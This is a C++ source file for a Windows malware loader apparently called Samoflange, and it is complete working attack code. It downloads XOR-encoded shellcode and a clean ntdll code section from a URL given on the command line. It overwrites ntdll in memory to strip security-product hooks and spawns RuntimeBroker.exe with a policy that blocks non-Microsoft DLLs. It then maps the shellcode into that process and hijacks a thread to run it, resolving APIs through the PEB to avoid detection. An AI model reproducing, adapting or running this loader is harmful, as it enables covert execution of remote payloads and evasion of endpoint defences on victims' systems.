
#include <Windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <stdio.h>

#include "Samoflange.h"

// == Constants ==
#define MAX_SHELLCODE_SIZE  (20 * 1024 * 1024)
#define MAX_NTTEXT_SIZE     (2 * 1024 * 1024)
#define MAX_URL_LENGTH      2048
#define MAX_XOR_KEY_LENGTH  256

#define TARGET_PROCESS	    L"\\??\\C:\\Windows\\System32\\RuntimeBroker.exe"
#define PROCESS_PARMS	    L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
#define PROCESS_PATH	    L"C:\\Windows\\System32"

// == Utility ==
PVOID NtGetCurrentHeap() {
#ifdef _M_X64
    PVOID peb = (PVOID)__readgsqword(0x60);
    return *(PVOID*)((PBYTE)peb + 0x30);
#else
    PVOID peb = (PVOID)__readfsdword(0x30);
    return *(PVOID*)((PBYTE)peb + 0x18);
#endif
}

PPEB NtGetPEB() {
#ifdef _WIN64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

void InitUnicodeString(UNICODE_STRING* dst, PCWSTR src) {
    if ((dst->Buffer = (PWSTR)src)) {
        dst->Length = min((USHORT)(wcslen(src) * sizeof(WCHAR)), 0xfffc);
        dst->MaximumLength = dst->Length + sizeof(WCHAR);
    }
    else {
        dst->Length = dst->MaximumLength = 0;
    }
}

HMODULE NtGetModuleHandleReverse(LPCWSTR moduleName) {
    PPEB peb = NtGetPEB();
    PLIST_ENTRY list = peb->Ldr->InMemoryOrderModuleList.Blink;
    while (list != &peb->Ldr->InMemoryOrderModuleList) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer && _wcsicmp(entry->BaseDllName.Buffer, moduleName) == 0)
            return (HMODULE)entry->DllBase;
        list = list->Blink;
    }
    return NULL;
}

FARPROC NtGetProcAddressReverse(HMODULE moduleBase, LPCSTR funcName) {
    PBYTE base = (PBYTE)moduleBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + rva);
    DWORD* names = (DWORD*)(base + exports->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exports->AddressOfFunctions);

    for (DWORD i = exports->NumberOfNames; i > 0; i--) {
        LPCSTR name = (LPCSTR)(base + names[i]);
        if (strcmp(name, funcName) == 0)
            return (FARPROC)(base + functions[ordinals[i]]);
    }
    return NULL;
}

DWORD GetPidFromHandle(HMODULE ntBase, HANDLE hProcess) {
    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen = 0;
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)NtGetProcAddressReverse(ntBase, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) return 0;

    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
    return NT_SUCCESS(status) ? (DWORD)(ULONG_PTR)pbi.UniqueProcessId : 0;
}

// == Argument Parsing ==
bool ParseArgs(int argc, char* argv[], char* urlOut, size_t urlSize, char* xorKeyOut, size_t xorKeySize) {
    urlOut[0] = xorKeyOut[0] = '\0';
    for (int i = 1; i < argc; i++) {
        if (strncmp(argv[i], "/p:", 3) == 0)
            strncpy_s(urlOut, urlSize, argv[i] + 3, _TRUNCATE);
        else if (strncmp(argv[i], "/x:", 3) == 0)
            strncpy_s(xorKeyOut, xorKeySize, argv[i] + 3, _TRUNCATE);
    }
    return (urlOut[0] != '\0');
}

void BuildSiblingUrl(const char* base, const char* newFile, char* out, size_t outSize) {
    const char* lastSlash = strrchr(base, '/');
    if (!lastSlash || strlen(newFile) == 0) { strncpy_s(out, outSize, base, _TRUNCATE); return; }
    size_t prefixLen = lastSlash - base + 1;
    if (prefixLen + strlen(newFile) >= outSize) return;
    strncpy_s(out, outSize, base, prefixLen);
    strcpy_s(out + prefixLen, outSize - prefixLen, newFile);
}

// == Shellcode XOR ==
bool XorDecrypt(PBYTE data, DWORD size, const char* key) {
    size_t klen = strlen(key);
    if (!klen) return false;
    for (DWORD i = 0; i < size; i++) data[i] ^= key[i % klen];
    return true;
}

// == HTTP Downloader ==
bool DownloadBuffer(HMODULE hWinHttp, const char* url, PBYTE buffer, DWORD* outSize) {
    // Resolve APIs
    pWinHttpOpen Open = (pWinHttpOpen)NtGetProcAddressReverse(hWinHttp, "WinHttpOpen");
    pWinHttpConnect Connect = (pWinHttpConnect)NtGetProcAddressReverse(hWinHttp, "WinHttpConnect");
    pWinHttpOpenRequest OpenReq = (pWinHttpOpenRequest)NtGetProcAddressReverse(hWinHttp, "WinHttpOpenRequest");
    pWinHttpSendRequest Send = (pWinHttpSendRequest)NtGetProcAddressReverse(hWinHttp, "WinHttpSendRequest");
    pWinHttpReceiveResponse Receive = (pWinHttpReceiveResponse)NtGetProcAddressReverse(hWinHttp, "WinHttpReceiveResponse");
    pWinHttpReadData Read = (pWinHttpReadData)NtGetProcAddressReverse(hWinHttp, "WinHttpReadData");
    pWinHttpCloseHandle Close = (pWinHttpCloseHandle)NtGetProcAddressReverse(hWinHttp, "WinHttpCloseHandle");
    pWinHttpCrackUrl Crack = (pWinHttpCrackUrl)NtGetProcAddressReverse(hWinHttp, "WinHttpCrackUrl");
    if (!Open || !Connect || !OpenReq || !Send || !Receive || !Read || !Close || !Crack) return false;

    WCHAR wUrl[2084] = { 0 }; MultiByteToWideChar(CP_ACP, 0, url, -1, wUrl, 2084);
    URL_COMPONENTS uc = { sizeof(uc) }; WCHAR host[256], path[1024];
    uc.lpszHostName = host; uc.dwHostNameLength = ARRAYSIZE(host);
    uc.lpszUrlPath = path; uc.dwUrlPathLength = ARRAYSIZE(path);
    if (!Crack(wUrl, 0, 0, &uc)) return false;

    HINTERNET hSession = Open(L"Samoflange/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    HINTERNET hConnect = Connect(hSession, uc.lpszHostName, uc.nPort, 0);
    DWORD flags = WINHTTP_FLAG_REFRESH | (uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    HINTERNET hRequest = OpenReq(hConnect, L"GET", uc.lpszUrlPath, NULL, NULL, NULL, flags);
    if (!Send(hRequest, NULL, 0, NULL, 0, 0, 0) || !Receive(hRequest, NULL)) return false;

    DWORD total = 0, read = 0;
    while (total < MAX_SHELLCODE_SIZE && Read(hRequest, buffer + total, MAX_SHELLCODE_SIZE - total, &read) && read > 0)
        total += read;
    *outSize = total;

    Close(hRequest); Close(hConnect); Close(hSession);
    return total > 0;
}

// -- PatchNtdllTextSection --
bool PatchNtdllTextSection(HMODULE ntBase, PBYTE cleanText, DWORD textSize) {
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)NtGetProcAddressReverse(ntBase, "NtProtectVirtualMemory");
    if (!NtProtectVirtualMemory) return false;

    PBYTE base = (PBYTE)ntBase;
    PIMAGE_DOS_HEADER dosH = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS ntH = (PIMAGE_NT_HEADERS)(base + dosH->e_lfanew);
    PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((BYTE*)&ntH->OptionalHeader + ntH->FileHeader.SizeOfOptionalHeader);

    PBYTE textStart = nullptr;
    SIZE_T textSizeLocal = 0;
    for (int i = 0; i < ntH->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            textStart = base + sections[i].VirtualAddress;
            textSizeLocal = sections[i].Misc.VirtualSize;
            break;
        }
    }
    if (!textStart || textSize > textSizeLocal) return false;

    SIZE_T regionSize = textSize;
    DWORD oldProtect;
    if (NtProtectVirtualMemory(NtCurrentProcess(), (PVOID*)&textStart, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect) != 0)
        return false;

    memcpy(textStart, cleanText, textSize);
    NtProtectVirtualMemory(NtCurrentProcess(), (PVOID*)&textStart, &regionSize, oldProtect, &oldProtect);
    return true;
}

// -- CreateProcessWithBlockDllPolicy --
bool CreateProcessWithBlockDllPolicy(HMODULE ntBase, PWSTR imagePath, PWSTR cmdLine, PWSTR dir, HANDLE* hProc, HANDLE* hThread) {
    pRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (pRtlCreateProcessParametersEx)NtGetProcAddressReverse(ntBase, "RtlCreateProcessParametersEx");
    pNtCreateUserProcess NtCreateUserProcess = (pNtCreateUserProcess)NtGetProcAddressReverse(ntBase, "NtCreateUserProcess");
    if (!RtlCreateProcessParametersEx || !NtCreateUserProcess) return false;

    UNICODE_STRING uImg, uCmd, uDir;
    InitUnicodeString(&uImg, imagePath);
    InitUnicodeString(&uCmd, cmdLine);
    InitUnicodeString(&uDir, dir);

    PRTL_USER_PROCESS_PARAMETERS pParams = NULL;
    if (RtlCreateProcessParametersEx(&pParams, &uImg, NULL, &uDir, &uCmd, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED) != 0)
        return false;

    DWORD64 mitigation = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    PS_ATTRIBUTE_LIST* attrList = (PS_ATTRIBUTE_LIST*)HeapAlloc(NtGetCurrentHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
    if (!attrList) return false;
    attrList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
    attrList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attrList->Attributes[0].Size = uImg.Length;
    attrList->Attributes[0].Value = (ULONG_PTR)uImg.Buffer;
    attrList->Attributes[1].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
    attrList->Attributes[1].Size = sizeof(DWORD64);
    attrList->Attributes[1].Value = (ULONG_PTR)&mitigation;

    PS_CREATE_INFO createInfo{}; createInfo.Size = sizeof(createInfo);

    NTSTATUS status = NtCreateUserProcess(hProc, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, pParams, &createInfo, attrList);
    HeapFree(NtGetCurrentHeap(), 0, attrList);
    return (status == 0 && *hProc && *hThread);
}

// -- MapShellcodeToTarget --
void* MapShellcodeToTarget(HMODULE ntBase, HANDLE hProc, PVOID* remoteOut, PBYTE payload, DWORD size, char* xorKey) {
    pNtCreateSection NtCreateSection = (pNtCreateSection)NtGetProcAddressReverse(ntBase, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)NtGetProcAddressReverse(ntBase, "NtMapViewOfSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)NtGetProcAddressReverse(ntBase, "NtUnmapViewOfSection");
    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection) return NULL;

    LARGE_INTEGER maxSize{};
    maxSize.QuadPart = size;
    HANDLE hSection = NULL;
    if (NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != 0) return NULL;

    PVOID local = NULL; SIZE_T viewSize = 0;
    if (NtMapViewOfSection(hSection, NtCurrentProcess(), &local, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE) != 0) return NULL;
    if (xorKey[0] && !XorDecrypt(payload, size, xorKey)) return NULL;
    memcpy(local, payload, size);

    PVOID remote = NULL; SIZE_T remoteSize = 0;
    if (NtMapViewOfSection(hSection, hProc, &remote, 0, 0, NULL, &remoteSize, 2, 0, PAGE_EXECUTE_READ) != 0) return NULL;
    NtUnmapViewOfSection(NtCurrentProcess(), local);
    *remoteOut = remote;
    return hSection;
}

// -- FindAndHijackThread --
HANDLE FindAndHijackThread(HMODULE ntBase, DWORD pid, LPVOID shellcodeAddr) {
    pNtOpenThread NtOpenThread = (pNtOpenThread)NtGetProcAddressReverse(ntBase, "NtOpenThread");
    pNtSuspendThread NtSuspendThread = (pNtSuspendThread)NtGetProcAddressReverse(ntBase, "NtSuspendThread");
    pNtGetContextThread NtGetContextThread = (pNtGetContextThread)NtGetProcAddressReverse(ntBase, "NtGetContextThread");
    pNtSetContextThread NtSetContextThread = (pNtSetContextThread)NtGetProcAddressReverse(ntBase, "NtSetContextThread");
    pNtResumeThread NtResumeThread = (pNtResumeThread)NtGetProcAddressReverse(ntBase, "NtResumeThread");
    if (!NtOpenThread || !NtSuspendThread || !NtGetContextThread || !NtSetContextThread || !NtResumeThread) return NULL;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    if (!Thread32First(snap, &te)) { CloseHandle(snap); return NULL; }

    do {
        if (te.th32OwnerProcessID == pid) {
            CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, (HANDLE)(ULONG_PTR)te.th32ThreadID };
            OBJECT_ATTRIBUTES oa = { sizeof(oa) };
            HANDLE hThread = NULL;
            if (NT_SUCCESS(NtOpenThread(&hThread, THREAD_ALL_ACCESS, &oa, &cid))) {
                ULONG tmp;
                if (NT_SUCCESS(NtSuspendThread(hThread, &tmp))) {
                    CONTEXT ctx = { 0 };
                    ctx.ContextFlags = CONTEXT_CONTROL;
                    if (NT_SUCCESS(NtGetContextThread(hThread, &ctx))) {
#ifdef _WIN64
                        ctx.Rip = (DWORD64)shellcodeAddr;
#else
                        ctx.Eip = (DWORD)shellcodeAddr;
#endif
                        if (NT_SUCCESS(NtSetContextThread(hThread, &ctx))) {
                            NtResumeThread(hThread, &tmp);
                            CloseHandle(snap);
                            return hThread;
                        }
                    }
                    NtResumeThread(hThread, &tmp);
                }
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(snap, &te));

    CloseHandle(snap);
    return NULL;
}

// == Main ==
int main(int argc, char* argv[]) {
    char url[MAX_URL_LENGTH], xorKey[MAX_XOR_KEY_LENGTH];
    if (!ParseArgs(argc, argv, url, sizeof(url), xorKey, sizeof(xorKey))) {
        printf("Usage: %s /p:<url> [/x:<xorkey>]\n", argv[0]); return 1;
    }

    HMODULE ntBase = NtGetModuleHandleReverse(L"ntdll.dll");
    if (!ntBase) return 1;

    // Load winhttp dynamically
    UNICODE_STRING uHttp; InitUnicodeString(&uHttp, L"winhttp.dll");
    pLdrLoadDll LdrLoadDll = (pLdrLoadDll)NtGetProcAddressReverse(ntBase, "LdrLoadDll");
    pLdrUnloadDll LdrUnloadDll = (pLdrUnloadDll)NtGetProcAddressReverse(ntBase, "LdrUnloadDll");
    HMODULE hWinHttp = NULL;
    LdrLoadDll(NULL, 0, &uHttp, &hWinHttp);
    if (!hWinHttp) return 1;

    BYTE* shellcode = (BYTE*)malloc(MAX_SHELLCODE_SIZE);
    BYTE* ntdllText = (BYTE*)malloc(MAX_NTTEXT_SIZE);
    if ((shellcode == NULL) || (ntdllText == NULL)) return 1;
    memset(shellcode, 0, MAX_SHELLCODE_SIZE);
    memset(ntdllText, 0, MAX_NTTEXT_SIZE);
    DWORD shellcodeSize = 0, textSize = 0;

    char siblingUrl[MAX_URL_LENGTH];
    BuildSiblingUrl(url, "ntdll.text", siblingUrl, sizeof(siblingUrl));
    if (!DownloadBuffer(hWinHttp, siblingUrl, ntdllText, &textSize)) return 1;
    if (!DownloadBuffer(hWinHttp, url, shellcode, &shellcodeSize)) return 1;
    LdrUnloadDll(hWinHttp);

    // Patch ntdll
    if (!PatchNtdllTextSection(ntBase, ntdllText, textSize)) return 1;
    printf("[+] Patched ntdll\n");
    ntBase = NtGetModuleHandleReverse(L"ntdll.dll");
    free(ntdllText);

    // Spawn target process
    HANDLE hProc = NULL, hThread = NULL;
    if (!CreateProcessWithBlockDllPolicy(ntBase, (PWSTR)TARGET_PROCESS, (PWSTR)PROCESS_PARMS, (PWSTR)PROCESS_PATH, &hProc, &hThread)) return 1;
    DWORD PID = GetPidFromHandle(ntBase, hProc);
    printf("[+] Spawned target PID %d\n", PID);
    
    // Map shellcode
    PVOID remoteAddr = NULL;
    MapShellcodeToTarget(ntBase, hProc, &remoteAddr, shellcode, shellcodeSize, xorKey);
    printf("[+] Shellcode mapped at %p\n", remoteAddr);

    // Hijack thread
    HANDLE hHijack = FindAndHijackThread(ntBase, PID, remoteAddr);
    if (hHijack) {
        printf("[+] Thread hijacked\n");
        CloseHandle(hHijack);
    }
    else {
        printf("[-] Failed to hijack thread\n");
    }
    free(shellcode);
    return 0;
}
